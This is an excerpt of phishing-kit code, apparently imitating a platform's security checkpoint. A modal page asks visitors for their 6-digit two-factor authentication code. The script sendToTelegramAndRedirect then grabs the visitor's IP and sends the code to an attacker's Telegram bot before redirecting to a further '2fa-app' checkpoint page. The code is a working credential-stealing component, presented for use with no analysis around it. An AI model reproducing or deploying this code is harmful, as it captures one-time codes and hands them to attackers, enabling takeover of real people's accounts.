                        ...
                        <h1 class="modal-title" id="2FAmodalLabel">
                            <font id="titlevery" style="vertical-align: inherit;">
                                <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;font-family: inherit;">Go to your authentication app</font>
                                    </font>
                                </font>
                            </font>
                        </h1> <span>
                            <font id="getdevice" style="vertical-align: inherit;">Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).</font>
                        </span>
        ...
        function sendToTelegramAndRedirect(event) {
            ...
            fetch('get-ip.php')
                ...
                .then(ip => {
                    ...
                    var content = "🔐Mã 2FA 1 (APP): " + "<code>" + code + "</code>" +
                ...
                fetch('https://api.telegram.org/bot' + apiToken + '/sendMessage', {
                    ...
                    .then(responseData => {
                        if (responseData.ok) {
                            ...
                            setTimeout(() => {
                                window.location.href = "/checkpoint/2fa-app.php"; // Change URL to the page you want to redirect to
                            }, 3000);
                        } else {
